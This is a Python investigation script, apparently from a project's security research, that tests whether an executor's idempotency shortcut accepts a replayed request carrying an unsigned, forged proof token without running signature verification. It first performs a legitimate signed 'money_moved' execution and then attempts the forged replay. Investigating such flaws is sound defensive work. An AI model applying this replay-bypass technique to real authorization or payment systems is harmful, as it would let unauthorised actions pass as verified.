#!/usr/bin/env python3
"""
Investigation script (not the final PoC) — does ProtectedExecutor's
idempotency short-circuit skip proof_verifier.verify() entirely when an
unsigned/garbage PCCB is presented for a known operation_id+action_hash?

Uses the repo's own tests/security/helpers.py fixtures.
"""
import sys
from pathlib import Path

# This script lives at <repo>/security-research/investigate_idempotency_order.py,
# so its repo root is two levels up. Resolve it dynamically instead of a
# hardcoded machine-specific path, so it works from any checkout.
_REPO_ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(_REPO_ROOT))
sys.path.insert(0, str(_REPO_ROOT / "tests"))

import tempfile
from dataclasses import replace

from actenon.execution.protected_executor import ProtectedExecutor
from actenon.idempotency import IdempotencyStore
from actenon.models.runtime import ProtectedExecutionRequest
from actenon.proof import PCCBVerifier, VerifierDisclosureMode
from actenon.replay import ReplayProtector, SqliteReplayStore

from tests.security.helpers import (
    build_security_context,
    build_security_intent,
    mint_security_pccb,
    security_signer,
    unsigned_pccb_with_action_hash,
)


class _Broker:
    from actenon.credentials import BrokeredCredential
    from datetime import timedelta

    def acquire(self, intent, pccb, context):
        return self.BrokeredCredential(
            credential_id="cred_test",
            issued_at=context.now,
            expires_at=context.now + self.timedelta(minutes=5),
            scope=("test",),
        )

    def release(self, credential, result):
        pass


def build_executor(tempdir: str) -> ProtectedExecutor:
    replay_db = tempfile.mktemp(suffix=".sqlite3", dir=tempdir)
    verify_calls = {"count": 0}
    real_verifier = PCCBVerifier(security_signer(), disclosure_mode=VerifierDisclosureMode.LOCAL_DEBUG)

    class CountingVerifier:
        def verify(self, intent, pccb, context):
            verify_calls["count"] += 1
            return real_verifier.verify(intent, pccb, context)

    executor = ProtectedExecutor(
        proof_verifier=CountingVerifier(),
        credential_broker=_Broker(),
        replay_protector=ReplayProtector(SqliteReplayStore(replay_db)),
        idempotency_store=IdempotencyStore(),
    )
    return executor, verify_calls


def main() -> int:
    with tempfile.TemporaryDirectory() as tempdir:
        executor, verify_calls = build_executor(tempdir)

        operation_id = "op_exploit_demo"
        intent1 = replace(build_security_intent(), metadata={"operation_id": operation_id})
        context1 = build_security_context()
        pccb1 = mint_security_pccb(intent=intent1, context=context1)  # REAL, validly signed
        request1 = ProtectedExecutionRequest(intent=intent1, pccb=pccb1, context=context1)

        def handler(req, cred):
            return {"result": "money_moved", "amount_minor": 1000}

        print("=== Step 1: legitimate first execution (real signed PCCB) ===")
        result1 = executor.execute(request1, handler)
        print(f"refusal={result1.refusal}")
        print(f"receipt outcome={result1.receipt.outcome if result1.receipt else None}")
        print(f"proof_verifier.verify() call count so far: {verify_calls['count']}")
        assert result1.refusal is None, "expected the first legitimate execution to succeed"

        print("\n=== Step 2: attacker replay — SAME operation_id, UNSIGNED PCCB ===")
        # The attacker builds the SAME intent (so action_hash matches the
        # recorded one) but with signature.value == 'pending' — i.e. no
        # real signature was ever produced by the issuer's key.
        forged_pccb = unsigned_pccb_with_action_hash(intent1, context1)
        print(f"forged_pccb.signature.value = {forged_pccb.signature.value!r}  (never actually signed)")
        request2 = ProtectedExecutionRequest(intent=intent1, pccb=forged_pccb, context=context1)

        verify_calls_before = verify_calls["count"]
        result2 = executor.execute(request2, handler)
        verify_calls_after = verify_calls["count"]

        print(f"refusal={result2.refusal}")
        print(f"payload={result2.payload}")
        print(f"proof_verifier.verify() calls during step 2: {verify_calls_after - verify_calls_before}")

        if result2.refusal is None and verify_calls_after == verify_calls_before:
            print("\n[CONFIRMED] The idempotency short-circuit returned SUCCESS for an "
                  "UNSIGNED/forged PCCB, and PCCBVerifier.verify() was never called "
                  "on this request at all.")
            return 0
        else:
            print("\n[NOT CONFIRMED] Either the request was refused, or verify() was called.")
            return 1


if __name__ == "__main__":
    raise SystemExit(main())
